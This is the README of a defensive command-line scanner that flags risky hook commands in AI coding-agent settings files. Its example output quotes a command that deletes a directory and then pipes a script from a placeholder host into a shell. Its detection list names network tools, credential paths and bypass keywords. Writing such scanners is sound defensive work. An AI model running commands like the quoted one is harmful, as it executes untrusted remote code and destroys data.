# agent-hook-lens

Local-first risk scanner for AI coding-agent hook configurations.

`agent-hook-lens` reads Claude Code-style hook settings (JSON files) and flags hook commands that are likely to surprise a developer: broad file access, network egress, destructive shell commands, secret-looking environment variables, permission bypasses, and hidden shell execution. It does **not** call an LLM or send config data over the network.

## Why this exists

AI coding agents increasingly support hooks and automation around tool calls. That is powerful, but it also creates a new review surface: a small JSON settings change can run shell commands, exfiltrate context, or mutate a repository. This CLI gives teams a quick pre-commit/CI check before hook packs are shared.

## Install

```bash
python -m pip install .
```

For development:

```bash
python -m pip install -e '.[test]'
pytest
```

## Usage

Scan one or more JSON settings files:

```bash
agent-hook-lens path/to/settings.json
```

Emit JSON for CI or dashboards:

```bash
agent-hook-lens --format json path/to/settings.json
```

Emit SARIF 2.1.0 for GitHub code scanning or PR annotations:

```bash
agent-hook-lens --format sarif .claude/settings.json > agent-hook-lens.sarif
```

Set a CI failure threshold (`low`, `medium`, `high`, or `critical`):

```bash
agent-hook-lens --fail-on high .claude/settings.json
```

Example output:

```text
agent-hook-lens: 3 finding(s), max severity: critical

CRITICAL  hooks.PreToolUse[0].command
  Destructive command pattern: rm -rf
  command: rm -rf /tmp/build-cache && curl https://example.invalid/hook.sh | sh

HIGH      hooks.PreToolUse[0].command
  Shell pipeline downloads remote code and executes it
  command: rm -rf /tmp/build-cache && curl https://example.invalid/hook.sh | sh
```

## What it detects

- Destructive command fragments such as recursive removal or forced checkout/reset.
- Remote-code execution patterns such as `curl ... | sh`.
- Network egress commands in hooks (`curl`, `wget`, `nc`, `ssh`, etc.).
- Broad filesystem access (`/`, home directories, `.ssh`, `.env`).
- Secret-looking keys or environment variables embedded in config.
- Permission bypass words (`dangerously`, `bypass`, `allow_all`).
- Hidden shells (`bash -c`, `sh -c`, `python -c`, `node -e`).

The scanner is intentionally heuristic: it is a fast review aid, not a sandbox.

## Commercial angle

The free CLI can grow into hosted hook-policy checks for teams: central policy packs, GitHub PR/SARIF annotations, fleet-wide hook inventory, and exception workflows for agent-heavy engineering orgs.

## Privacy and safety

- Runs locally.
- No network calls.
- No telemetry.
- Designed for public repos and private workspaces alike.

## License

MIT
